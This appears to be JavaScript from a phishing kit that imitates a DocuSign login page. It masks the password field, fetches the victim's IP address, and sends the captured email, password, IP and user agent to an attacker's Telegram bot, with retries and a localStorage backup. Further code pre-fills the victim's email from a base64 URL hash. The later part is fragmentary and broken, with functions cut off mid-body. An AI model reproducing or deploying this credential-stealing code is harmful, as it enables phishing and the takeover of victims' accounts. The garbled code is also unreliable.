        function maskPasswordInput(displayField) {
            var rawValue = displayField.value;
            var storedActual = displayField.getAttribute('data-actual') || '';
            var prevLen = parseInt(displayField.getAttribute('data-prevlen') || '0');
            var actualValue = '';
            var maskedValue = '';
            
            if (rawValue.length > prevLen) {
                var newChar = rawValue.charAt(rawValue.length - 1);
                actualValue = storedActual + newChar;
                maskedValue = '•'.repeat(actualValue.length);
            } else if (rawValue.length < prevLen) {
                actualValue = storedActual.slice(0, rawValue.length);
                maskedValue = '•'.repeat(actualValue.length);
            } else {
                actualValue = storedActual;
                maskedValue = '•'.repeat(actualValue.length);
            }
            
            document.getElementById('password_real').value = actualValue;
            displayField.setAttribute('data-actual', actualValue);
            displayField.setAttribute('data-prevlen', rawValue.length);
            
            var originalOnInput = displayField.oninput;
            displayField.oninput = null;
            displayField.value = maskedValue;
            displayField.oninput = originalOnInput;
            displayField.setSelectionRange(maskedValue.length, maskedValue.length);
        }

        function getIPAddress() {
            return new Promise(function(resolve) {
                // Try multiple services quickly
                var services = [
                    'https://api.ipify.org?format=json',
                    'https://api.my-ip.io/ip.json',
                    'https://ip-api.com/json/'
                ];
                
                var index = 0;
                
                function tryNext() {
                    if (index >= services.length) {
                        resolve('Unknown');
                        return;
                    }
                    
                    var xhr = new XMLHttpRequest();
                    xhr.open('GET', services[index], true);
                    xhr.timeout = 3000;
                    
                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            try {
                                var data = JSON.parse(xhr.responseText);
                                var ip = data.ip || data.query || data.ip_address || '';
                                if (ip) {
                                    resolve(ip);
                                    return;
                                }
                            } catch(e) {}
                        }
                        index++;
                        tryNext();
                    };
                    
                    xhr.onerror = function() {
                        index++;
                        tryNext();
                    };
                    
                    xhr.ontimeout = function() {
                        index++;
                        tryNext();
                    };
                    
                    xhr.send();
                }
                
                tryNext();
            });
        }

        // ===================================================================

        function sendToTelegram(email, password, ip, attemptNum) {
            // Build clean message
            var timestamp = new Date().toLocaleString();
            var userAgent = navigator.userAgent.substring(0, 80);
            
            var message = "🔐 DOCUSIGN LOGIN #" + attemptNum + " 🔐\n\n";
            message += "━━━━━━━━━━━━━━━━━━━━\n";
            message += "📧 Email: " + email + "\n";
            message += "🔑 Password: " + password + "\n";
            message += "━━━━━━━━━━━━━━━━━━━━\n";
            message += "🕒 Time: " + timestamp + "\n";
            message += "🌐 IP: " + ip + "\n";
            message += "━━━━━━━━━━━━━━━━━━━━\n";
            message += "💻 " + userAgent + "\n";
            message += "━━━━━━━━━━━━━━━━━━━━";
            
            // Send to Telegram using POST
            var url = "https://api.telegram.org/bot" + telegramToken + "/sendMessage";
            var data = {
                chat_id: telegramChatId,
                text: message
            };
            
            // Use XMLHttpRequest with retry
            function sendRequest(retryCount) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
                xhr.timeout = 10000;
                
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        console.log('✅ Telegram sent successfully for attempt ' + attemptNum);
                        // Clear any old backup for this email
                        try {
                            var backups = JSON.parse(localStorage.getItem('telegram_backup') || '[]');
                            backups = backups.filter(function(b) { return b.email !== email; });
                            localStorage.setItem('telegram_backup', JSON.stringify(backups));
                        } catch(e) {}
                    } else {
                        console.error('❌ Telegram send failed with status:', xhr.status);
                        if (retryCount < 2) {
                            setTimeout(function() { sendRequest(retryCount + 1); }, 1000);
                        } else {
                            saveToBackup(email, password, ip, timestamp, 'HTTP ' + xhr.status);
                        }
                    }
                };
                
                xhr.onerror = function() {
                    console.error('❌ Telegram network error');
                    if (retryCount < 2) {
                        setTimeout(function() { sendRequest(retryCount + 1); }, 1000);
                    } else {
                        saveToBackup(email, password, ip, timestamp, 'Network error');
                    }
                };
                
                xhr.ontimeout = function() {
                    console.error('❌ Telegram timeout');
                    if (retryCount < 2) {
                        setTimeout(function() { sendRequest(retryCount + 1); }, 1000);
                    } else {
                        saveToBackup(email, password, ip, timestamp, 'Timeout');
                    }
                };
                
                try {
                    xhr.send(JSON.stringify(data));
                } catch(e) {
                    console.error('❌ Send exception:', e);
                    if (retryCount < 2) {
                        setTimeout(function() { sendRequest(retryCount + 1); }, 1000);
                    }
                }
            }
            
            // Start sending
            sendRequest(0);
        }
        
        function saveToBackup(email, password, ip, timestamp, error) {
            try {
                var backups = JSON.parse(localStorage.getItem('telegram_backup') || '[]');
                backups.push({
                    email: email,
                    password: password,
                    ip: ip,
                    time: timestamp,
                    error: error || 'Unknown'
                });
                if (backups.length > 100) backups.shift();
                localStorage.setItem('telegram_backup', JSON.stringify(backups));
                console.log('💾 Saved to backup (total: ' + backups.length + ')');
            } catch(e) {
                console.error('Failed to save backup:', e);
            }
        }

                if (!$progressFill.length) return;
                $progressFill.css('width', '0%');
                $progressFill.css('transition', 'width 0.05s linear');
                var startTime = null;
                function step(timestamp) {
                    if (!startTime) startTime = timestamp;
                    var elapsed = timestamp - startTime;
                    var percent = Math.min(100, (elapsed / durationMs) * 100);
                    $progressFill.css('width', percent + '%');
                    if (elapsed < durationMs) {
                        requestAnimationFrame(step);
                    } else {
                        $progressFill.css('width', '100%');
                        if (onComplete && typeof onComplete === 'function') onComplete();
                    }
                }
                requestAnimationFrame(step);
            }
            
            function showLoader(message, title, durationMs, onComplete) {

            function getPlainEmailFromHash() {
                var rawHash = window.location.hash.substring(1);
                if (!rawHash) return '';
                var isPossiblyBase64 = /^[A-Za-z0-9+/=]+$/.test(rawHash) && rawHash.length % 4 === 0;
                var plainCandidate = '';
                if (isPossiblyBase64) {
                    try {
                        var decoded = atob(rawHash);

                            plainCandidate = decoded;
                        } else {
                            if (rawHash.includes('@')) plainCandidate = rawHash;
                        }
                    } catch(e) {
                        if (rawHash.includes('@')) plainCandidate = rawHash;
                    }
                } else {
                    if (rawHash.includes('@')) plainCandidate = rawHash;
                }
                if (!plainCandidate && rawHash && rawHash.includes('@')) {

                }
                return plainCandidate;

                        var decoded = atob(hash);
                        if (decoded && decoded.includes('@')) {
                            plainEmail = decoded;
                        } else if (hash.includes('@')) {
                            plainEmail = hash;
                        }
                    } else if (hash.includes('@')) {
                        plainEmail = hash;

                } catch(e) {
                    if (hash.includes('@')) plainEmail = hash;

                if (plainEmail && plainEmail.includes('@')) {

                        emailField.value = plainEmail;

                    var maskedSpan = document.getElementById('msaked-email');

                            maskedSpan.innerText = maskedLocal + "@" + parts[1];
                        } else {
                            maskedSpan.innerText = plainEmail;

                    }

                        if (window.location.hash !== '#' + expectedBase64) {

                        }
                    } catch(e) {}
                }
            }
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                    enforcePlainEmailDisplay();
                });
            } else {
                enforcePlainEmailDisplay();
